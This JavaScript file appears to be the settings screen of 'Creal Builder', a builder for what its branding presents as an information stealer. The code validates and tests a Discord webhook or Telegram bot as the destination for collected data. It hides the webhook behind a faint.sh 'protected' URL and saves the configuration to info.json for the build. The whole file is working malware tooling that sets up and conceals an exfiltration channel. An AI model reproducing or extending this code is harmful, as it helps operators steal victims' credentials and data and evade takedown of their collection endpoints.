// ## SIDEBAR SELECTOR ## //
const sidebar = document.querySelector('.sidebar'); // setup sidebar
const togglebtn = document.querySelector('.toggle-btn'); // setup toggle button

togglebtn.addEventListener('click', () => { // defining a page's active status (active or not)
    sidebar.classList.toggle('active'); // set active
});

document.addEventListener('DOMContentLoaded', () => {
    // Select DOM elements
    const discordInput = document.getElementById('input1');
    const telegramTokenInput = document.getElementById('input2');
    const telegramChatIdInput = document.getElementById('input3');
    const testButton = document.getElementById('testButton');
    const saveButton = document.querySelector('label[for="input-file"]');
    const helpButton = document.getElementById('helpButton');

    // Function to send a test message to a Discord webhook
    async function sendTestEmbed(webhookURL) {
        const testEmbed = {
            title: '**Your Webhook Works Perfectly ✅**',
            author: {
                name: 'Creal Builder',
                icon_url: 'https://cdn.discordapp.com/attachments/1287091315070206005/1287523496427130880/68747470733a2f2f692e696d6775722e636f6d2f4d6a6f494348702e706e67.png'
            },
            color: 0x303037,
            footer: {
                text: 't.me/crealstealerr',
            },
        };

        try {
            await axios.post(webhookURL, { embeds: [testEmbed] });
            console.log('Discord Webhook Test Message Sent Successfully!');
            alert('Discord Webhook Test Message Sent Successfully!');
        } catch (error) {
            console.error('Failed to send test message to Discord Webhook.', error);
            if (error.response) {
                alert(`Failed to send test message to Discord Webhook.\nStatus: ${error.response.status}\nMessage: ${error.response.data}`);
            } else {
                alert('Failed to send test message to Discord Webhook.\nError: ' + error.message);
            }
        }
    }

    // Function to send a test message to a Telegram bot
    async function sendTestMessage(botToken, chatId) {
        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const testMessage = {
            chat_id: chatId,
            text: '**Your Bot Works Perfectly ✅**',
            parse_mode: 'Markdown',
        };

        try {
            await axios.post(apiUrl, testMessage);
            console.log('Telegram Bot Test Message Sent Successfully!');
            alert('Telegram Bot Test Message Sent Successfully!');
        } catch (error) {
            console.error('Failed to send test message to Telegram Bot.', error);
            if (error.response) {
                alert(`Failed to send test message to Telegram Bot.\nStatus: ${error.response.status}\nMessage: ${error.response.data.description}`);
            } else {
                alert('Failed to send test message to Telegram Bot.\nError: ' + error.message);
            }
        }
    }

    // Function to validate the Discord webhook URL
    function isValidDiscordWebhookURL(url) {
        const regex = /^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]{68}$/;
        return regex.test(url);
    }

    // Function to validate the Telegram bot token
    function isValidTelegramBotToken(token) {
        const regex = /^\d{9,12}:[\w-]{35}$/;
        return regex.test(token);
    }

    // Function to validate the Telegram chat ID | i just add for group
    function isValidTelegramChatID(chatID) {
    const regex = /^-?\d+$/;
    return regex.test(chatID);
    }


    // Function to enable/disable text fields based on input
    function updateInputStates() {
        const discordText = discordInput.value.trim();
        const telegramTokenText = telegramTokenInput.value.trim();
        const telegramChatIdText = telegramChatIdInput.value.trim();

        if (discordText) {
            telegramTokenInput.disabled = true;
            telegramChatIdInput.disabled = true;
            telegramTokenInput.classList.add('locked');
            telegramChatIdInput.classList.add('locked');
            discordInput.disabled = false;
            discordInput.classList.remove('locked');
        } else if (telegramTokenText || telegramChatIdText) {
            discordInput.disabled = true;
            discordInput.classList.add('locked');
            telegramTokenInput.disabled = false;
            telegramChatIdInput.disabled = false;
            telegramTokenInput.classList.remove('locked');
            telegramChatIdInput.classList.remove('locked');
        } else {
            discordInput.disabled = false;
            telegramTokenInput.disabled = false;
            telegramChatIdInput.disabled = false;
            discordInput.classList.remove('locked');
            telegramTokenInput.classList.remove('locked');
            telegramChatIdInput.classList.remove('locked');
        }
    }

    // Add event listeners to monitor changes in text fields
    discordInput.addEventListener('input', updateInputStates);
    telegramTokenInput.addEventListener('input', updateInputStates);
    telegramChatIdInput.addEventListener('input', updateInputStates);

function saveInfo() {
    const discordWebhookURL = discordInput.value.trim();
    const telegramBotToken = telegramTokenInput.value.trim();
    const telegramChatID = telegramChatIdInput.value.trim();

    if ((discordWebhookURL && isValidDiscordWebhookURL(discordWebhookURL)) || 
        (telegramBotToken && isValidTelegramBotToken(telegramBotToken) && telegramChatID && isValidTelegramChatID(telegramChatID))) {


        fetch("https://faint.sh/create", {
            method: "POST",
            body: new URLSearchParams({
                "webhook": discordWebhookURL // Send the Discord Webhook URL as the payload
            })
        })
        .then(response => response.json()) // Parse the JSON response
        .then(responseData => {
            // Extract the protected_url from the response
            const protectedURL = responseData.protected_url;

            // Store the protected URL in localStorage instead of the original Webhook URL
            localStorage.setItem('discordWebhookURL', protectedURL);
            localStorage.setItem('telegramBotToken', telegramBotToken);
            localStorage.setItem('telegramChatID', telegramChatID);

            // Store the data in a JSON file
            const data = {
                discordWebhookURL: protectedURL, // Store protected URL
                telegramBotToken: telegramBotToken,
                telegramChatID: telegramChatID
            };

            const fs = require('fs');
            const path = require('path');

            fs.writeFile(path.join(__dirname, '..', 'info.json'), JSON.stringify(data, null, 2), (err) => {
                if (err) {
                    console.error('Failed to save info to JSON file.', err);
                    alert('Failed to save info to JSON file.');
                } else {
                    console.log('Information saved to JSON file successfully!');
                    alert('Information saved successfully!');
                }
            });
        })
        .catch(error => {
            console.error('Error fetching the protected URL:', error);
            alert('Failed to fetch the protected URL.');
        });
    } else {
        alert('Please provide a valid Discord Webhook URL or valid Telegram Bot Token and Chat ID before saving.');
    }
}


    // Add event listener for the "Save" button
    saveButton.addEventListener('click', () => {
        saveInfo();
    });

    // Add event listener for the "Test" button
    testButton.addEventListener('click', () => {
        const discordWebhookURL = discordInput.value.trim();
        const telegramBotToken = telegramTokenInput.value.trim();
        const telegramChatID = telegramChatIdInput.value.trim();

        if (discordWebhookURL && isValidDiscordWebhookURL(discordWebhookURL)) {
            sendTestEmbed(discordWebhookURL);
        } else if (discordWebhookURL) {
            alert('Please provide a valid Discord Webhook URL.');
        }

        if (telegramBotToken && isValidTelegramBotToken(telegramBotToken) && telegramChatID && isValidTelegramChatID(telegramChatID)) {
            sendTestMessage(telegramBotToken, telegramChatID);
        } else if (telegramBotToken || telegramChatID) {
            alert('Please provide a valid Telegram Bot Token and Chat ID.');
        }

        if (!discordWebhookURL && (!telegramBotToken || !telegramChatID)) {
            alert('Please provide at least one valid webhook URL or bot token and chat ID.');
        }
    });

    // Initialize input states on load
    updateInputStates();
});

// Function to open links based on clicked icon
function openHelp(type) {
    const urls = {
        discord: 'https://youtu.be/fKksxz2Gdnc?si=T3rRJJ-pR5o74zG1',
        telegramToken: 'https://t.me/BotFather',
        telegramChat: 'https://t.me/chatIDrobot'
    };

    const url = urls[type];
    if (url) {
        require('electron').shell.openExternal(url);
    }
}

// Function to show a help message
function showHelpMessage() {
    alert('Click on the question mark icons (?) next to each input field for more information.');
}

// Add an event listener for the help button
document.getElementById('helpButton').addEventListener('click', showHelpMessage);
